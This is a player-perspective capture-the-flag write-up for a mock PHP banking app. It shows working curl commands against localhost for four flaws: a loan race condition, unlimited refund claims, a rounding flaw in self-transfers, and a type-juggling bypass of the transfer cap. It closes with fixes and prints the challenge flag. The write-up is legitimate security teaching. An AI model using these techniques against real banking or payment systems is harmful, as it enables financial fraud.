# BankruptMe — Writeup (Player Perspective)

**Category:** Web  
**Difficulty:** Hard 
**Goal:** Reach a balance of **1,000,000 DA** to unlock `/vip.php` and get the flag.

---

## First Look — Reconnaissance

You open the challenge URL and land on a login page.  
You register an account and log in. The dashboard shows:

```
Balance: 1,000.00 DA
```

You explore the navigation:

| Page | What it does |
|------|-------------|
| `/index.php` | Dashboard — shows your balance |
| `/transfer.php` | Send money to another user |
| `/loan.php` | Request a loan of 500,000 DA |
| `/refund.php` | Claim a refund from a merchant |
| `/history.php` | Transaction history |
| `/vip.php` | Locked — requires 1,000,000 DA |

The goal is clear: **get to 1,000,000 DA**. You start poking each feature.

---

## Exploring the Loan Page

You click **"Request Loan"** — you receive **500,000 DA**. Nice.  
You try clicking it again — you get:

```
An active loan already exists on this account.
```

So only one loan per account. But you notice something: the request takes about **half a second** to process. That's unusual. Why is a database query that slow?

> **Instinct:** A deliberate `sleep()` or `usleep()` in the code. This is a classic hint for a **race condition**.

You fire two requests at the exact same time from your terminal:

```bash
curl -s -b cookies.txt -X POST http://localhost:8080/loan.php &
curl -s -b cookies.txt -X POST http://localhost:8080/loan.php &
wait
```

You refresh the dashboard:

```
Balance: 1,001,000.00 DA  ✓
```

Both requests passed the "no active loan" check before either one committed to the database. You now have **2 × 500,000 DA** credited.

> **Root cause:** The eligibility check uses a plain `SELECT COUNT(*)` with no row lock (`SELECT ... FOR UPDATE`). The artificial `usleep(500000)` widens the race window enough to exploit it reliably.

---

## Getting the Flag

Balance is over 1,000,000 DA. You navigate to `/vip.php`:

```
 Welcome to the VIP Lounge
 FLAG: mctf{r4c3_c0nd1t10n_und3rfl0w_juggl1ng_ch41n}
```

---

## But Wait — There Are More Paths

If the race condition didn't work on the first try, you'd keep digging. Here are the other vulnerabilities you would discover while exploring.

---

### Alternative Path 1 — Refund Abuse (no timing required)

On `/refund.php` you pick a merchant and click "Claim Refund".  
You get **+5,000 DA** credited instantly.  
You click again. Another **+5,000 DA**.  
There's no limit check, no cooldown.

```bash
for i in $(seq 1 200); do
  curl -s -b cookies.txt -X POST http://localhost:8080/refund.php \
    -d "merchant_id=1"
done
# 200 × 5,000 = 1,000,000 DA
```

You check `/history.php` and notice the merchant balance is **0.00** — it never goes negative. The merchant debit fails silently, but your credit is already written and never rolled back.

> **Root cause:** The code credits the user **before** validating the merchant's balance. The merchant debit is wrapped in a `try/catch` that swallows the error. Credit stands regardless.

---

### Alternative Path 2 — Transfer Rounding Abuse

On `/history.php` you notice two columns: **Amount** and **Raw Amount**.  
For a normal transfer of `10.50`, both columns show `10.50`.  
But you try a transfer of `0.004` to yourself and see:

| Amount (displayed) | Raw Amount |
|-------------------|------------|
| 0.00 | 0.004 |

You were charged **0.00** but credited **0.004**. Free money.

```bash
for i in $(seq 1 250); do
  curl -s -b cookies.txt -X POST http://localhost:8080/transfer.php \
    -d "recipient=YOUR_USERNAME&amount=0.004"
done
# 250 × 0.004 = +1 DA (net gain, slow but illustrates the bug)
```

> **Root cause:** The sender is debited `round($amount, 2)` (which rounds 0.004 → 0.00), but the receiver is credited the raw float `0.004`. Self-transfer = infinite money printer.

---

### Alternative Path 3 — Type Juggling Anti-Fraud Bypass

You notice the transfer page blocks large amounts:

```
Large transfers require in-branch verification (limit: 10,000 DA).
```

You try sending `amount=1e6` (scientific notation for 1,000,000).  
It goes through.

> **Why?**  
> PHP casts `"1e6"` to `(int)` as `1` → `1 > 10000` is **false** → check passes.  
> But later `(float)"1e6"` = `1,000,000.0` — the full amount is transferred.

This lets you move 1,000,000 DA between two accounts in one shot, bypassing the 10,000 DA cap.

---

## Summary of Vulnerabilities

| # | Vulnerability | Where | What you notice |
|---|--------------|-------|-----------------|
| 1 | Currency rounding abuse | `/transfer.php` | History shows `Amount` ≠ `Raw Amount` |
| 2 | **Loan race condition** *(primary path)* | `/loan.php` | ~500ms delay on a simple form |
| 3 | Refund logic inversion | `/refund.php` | No limit, merchant balance stays 0 |
| 4 | PHP type juggling | `/transfer.php` | `1e6` bypasses the 10k cap |

---

## Fastest Solve (TL;DR)

```bash
# 1. Register + login (save cookies)
curl -sc cookies.txt http://localhost:8080/register.php \
  -d "username=hacker&email=h@x.com&password=H4ck3r!"
curl -sc cookies.txt -b cookies.txt http://localhost:8080/login.php \
  -d "username=hacker&password=H4ck3r!"

# 2. Race condition — fire 4+ parallel loan requests
for i in 1 2 3 4; do
  curl -s -b cookies.txt -X POST http://localhost:8080/loan.php &
done
wait

# 3. Get the flag
curl -s -b cookies.txt http://localhost:8080/vip.php | grep -oP 'mctf\{[^}]+\}'
```

**Flag:** `mctf{r4c3_c0nd1t10n_und3rfl0w_juggl1ng_ch41n}`

---

## What to Learn From This Challenge

- **Race conditions** happen when a check and an action are not atomic. Always use `SELECT ... FOR UPDATE` inside a transaction.
- **Never credit before debiting.** The correct order: validate → debit source → credit destination, all in one transaction with rollback.
- **Never mix `round()` and raw floats** for the same monetary value. Use integer cents throughout.
- **Never trust PHP type coercion** for security checks. Validate and cast explicitly before comparing: `$amount = (float)$_POST['amount']; if ($amount > 10000)`.
